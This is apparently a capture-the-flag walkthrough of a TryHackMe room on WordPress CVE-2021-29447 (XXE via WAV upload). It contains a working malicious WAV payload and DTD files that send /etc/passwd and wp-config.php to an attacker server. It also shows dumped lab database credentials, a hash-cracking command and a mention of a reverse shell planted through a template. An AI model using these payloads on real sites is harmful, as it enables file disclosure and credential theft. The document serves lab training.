---
title: Walkthrough - Wordpress CVE-2021-29447
published: false
---

Tags: CVE-2021-29447, xxe, webapp, wordpress.
Description: Vulnerability allow a authenticated user whith low privilages upload a malicious WAV file that could lead to remote arbitrary file disclosure and server-side request forgery (SSRF).
Difficulty: Easy
URL: [https://tryhackme.com/room/wordpresscve202129447](https://tryhackme.com/room/wordpresscve202129447)

* * *

## Notes

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f0:65:b8:42:b7:c3:ba:8e:fe:e4:3c:cd:57:f1:29:2e (RSA)
|   256 42:1e:1b:8f:19:38:99:2e:36:70:cf:0e:b6:31:92:14 (ECDSA)
|_  256 8e:89:43:de:5d:9b:99:66:c4:2a:93:17:f3:0e:e1:f4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-generator: WordPress 5.6.2
|_http-title: Tryhackme &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.18 (Ubuntu)
3306/tcp open  mysql   MySQL 5.7.33-0ubuntu0.16.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.33-0ubuntu0.16.04.1
|   Thread ID: 8
|   Capabilities flags: 65535
|   Some Capabilities: LongColumnFlag, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsTransactions, Speaks41ProtocolOld, SwitchToSSLAfterHandshake, LongPassword, ConnectWithDatabase, InteractiveClient, IgnoreSigpipes, FoundRows, SupportsLoadDataLocal, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, Support41Auth, ODBCClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: yQ{\x06\\x15Zy([=E46R*^\x15)\x0E
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
| Not valid before: 2021-05-26T21:23:31
|_Not valid after:  2031-05-24T21:23:31
```

viewing the website we find the author `test-corp` now need the password which is `test`

* * * 

## Use the vulnerability CVE-2021-29447 to read the wordpress configuration file.

1. We have credentials for the login `test-corp:test` so we have user permission to upload media files.
2. Create a malicious WAV file
3. `nano poc.wav` with `echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav`
4. create the `NAMEEVIL.dtd` file with the following code 
```
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY % trick SYSTEM 'http://[MY IP]:9999/?p=%file;'>" >
```
5. Launch http server `php -S 0.0.0:80` and upload the .wav

![0xskar](/assets/wordpresscve202129447-01.png)

* * * 

## Based on the results of #1, what is the name of the database for WordPress?

Modifying the NAMEEVIL.dtd to grap wp.config.

```
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/html/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.2.127.225:80/?p=%file;'>" >
```

- Decode the base64 and raw inflate to see the contents

```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpressdb2' );

/** MySQL database username */
define( 'DB_USER', 'thedarktangent' );

/** MySQL database password */
define( 'DB_PASSWORD', 'sUp3rS3cret132' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wptry_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */
define('WP_HOME', false);
define('WP_SITEURL', false);

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

* * * 

## Based on the results of #1, what are the credentials you found? example: user:password

- `thedarkangent:sUp3rS3cret132`

* * * 

## Enumerate and identify what is the dbms installed on the server?

- `mysql`

* * * 

## Based on the results of #4, what is the dbms version installed on the server?

- from the nmap 5.7.33

* * * 

## Based on the results of #4, what port is the dbms running on?

- from the nmap 3306

* * * 

## Compromise the dbms, What is the encrypted password located in the wordpress  users table with id 1??

- Connect to the db `mysql -h 10.10.71.47 -P 3306 -u thedarktangent -p wordpressdb2`
- `SELECT * FROM wptry_users;`
or
- `SELECT ID, user_login, user_pass FROM wptry_users WHERE ID = 1;`
- `$P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1`

* * * 

## Based on the results of #7, What is the password in plaint text?

- `john corp-001.hash --wordlist=/usr/share/seclists/Passwords/rockyou.txt --format=phpass`

- corp-001:teddybear

* * * 

## Compromise the machine and locate flag.txt

- with the above credentials we can access the admin's wordpress dashboard. here we can edit a template to send us a reverse shell.

![0xskar](/assets/wordpresscve202129447-03.png)

* * * 

